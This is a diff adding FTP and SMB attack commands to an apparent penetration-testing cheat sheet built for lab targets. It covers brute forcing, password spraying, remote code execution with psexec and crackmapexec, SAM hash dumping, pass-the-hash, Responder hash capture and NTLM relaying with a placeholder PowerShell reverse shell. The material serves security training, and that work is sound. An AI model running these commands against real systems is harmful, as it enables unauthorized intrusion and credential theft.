@@ -1125,6 +1125,108 @@ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/roc
 
 
 # Attacking Common Services
+## FTP
+### Enumerate FTP with nmap
+```
+sudo nmap -sC -sV -p 21 192.168.2.142 
+```
+### Check for Anonymous Access
+```
+ftp 192.168.2.142
+```
+### Brute Forcing with Medusa
+```
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
+```
+### FTP BounceBack Attack
+```
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
+
+## SMB
+### Enumerate SMB with nmap
+```
+nmap 10.129.14.128 -sV -sC -p139,445
+```
+### Check for Null Session
+```
+smbclient -N -L //10.129.14.128
+```
+### SMBMap
+#### Check for File Shares
+```
+smbmap -H 10.129.14.128
+```
+#### Browse a Directory Recursively with smbmap
+```
+smbmap -H 10.129.14.128 -r notes
+```
+#### Download a File with smbmap
+```
+smbmap -H 10.129.14.128 --download "notes\note.txt"
+```
+#### Upload a File with smbmap
+```
+smbmap -H 10.129.14.128 --upload test.txt "notes\note.txt"
+```
+### Remote Procedure Call (RPC)
+#### Check for Null Session
+```
+rpcclient -U'%' 10.10.110.17
+```
+#### Enumeration with RPC
+```
+enumdomusers
+```
+### Enum4linux
+```
+enum4linux 10.10.11.45 -A -C
+```
+### Password Spray with CME
+```
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+```
+### RCE with PSExec
+```
+psexec administrator:'Password123!'@10.10.110.17
+```
+### RCE with CME
+```
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+```
+### RCE Enumeration
+```
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+```
+### Pass the Hash with CME
+```
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+```
+### Capture Hashes with Responder
+```
+responder -I ens33
+```
+### Crack hashes with Hashcat
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+### NTLMRelayx
+#### Edit responder.conf
+```
+SMB = Off
+```
+#### Run ntlmrelayx
+```
+ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 
+ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 -c 'powershell -e base64 from revshells.com'
+nc -nvlp 9001
+```
+
+## SQL Databases
+## RDP
+## DNS
+## SMTP
 
 # Pivoting, Tunneling, and Port Forwarding
 
